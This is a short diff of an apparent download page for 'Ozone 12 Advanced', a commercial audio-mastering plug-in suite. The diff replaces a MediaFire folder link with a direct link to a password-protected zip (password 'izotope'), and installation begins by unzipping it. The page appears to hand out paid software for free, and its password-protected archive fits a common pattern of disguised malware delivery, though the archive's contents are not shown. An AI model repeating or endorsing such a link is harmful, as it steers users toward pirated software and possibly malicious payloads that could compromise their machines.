@@ -4,7 +4,7 @@ Ozone 12, Ozone 12 Bass Control, Ozone 12 Clarity, Ozone 12 Dynamic EQ, Ozone 12
 
 Ozone is a versatile suite of 20 professional plug-ins for modern mastering, complemented by a time-saving AI-powered assistant
 
-<a href="https://www.mediafire.com/folder/ikxnd9j6ilusr/iZotope"> Download here (password: izotope) </a>
+<a href="https://www.mediafire.com/file/a9x3uj9a36ntorw/iZotope+-+Ozone+12+Advanced+v12.2.0.zip/file"> Download here (password: izotope) </a>
 
 ## Installation
 1. Unzip Archive (password: izotope)
